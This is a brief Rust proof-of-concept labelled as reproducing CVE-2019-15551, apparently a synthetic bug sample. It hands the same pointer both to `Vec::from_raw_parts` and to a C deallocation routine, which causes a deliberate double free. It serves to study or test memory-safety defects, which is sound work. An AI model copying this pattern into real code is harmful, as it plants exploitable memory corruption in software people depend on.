// Proof-of-concept of CVE-2019-15551
mod cuaf;
use crate::cuaf::allocate_c;
use crate::cuaf::deallocate_c;
#[no_mangle]
unsafe fn deallocate(ptr: *mut i64, length: usize, capacity: usize) {
    let _vec: Vec<i64> = Vec::from_raw_parts(ptr, length, capacity);
    deallocate_c(ptr);
}

fn bug(n: i32, v: *mut i64, len: usize, cap: usize) {
    if n < 0 {
        println!("BUG!");
    } else {
        println!("NO BUG!");
        return;
    }
    unsafe {
        deallocate(v, len, cap);
    }
}
fn main() {
    let v_buffer_ptr = unsafe { allocate_c(4 as u64) };
    bug(-1, v_buffer_ptr, 4 as usize, 4 as usize);
}
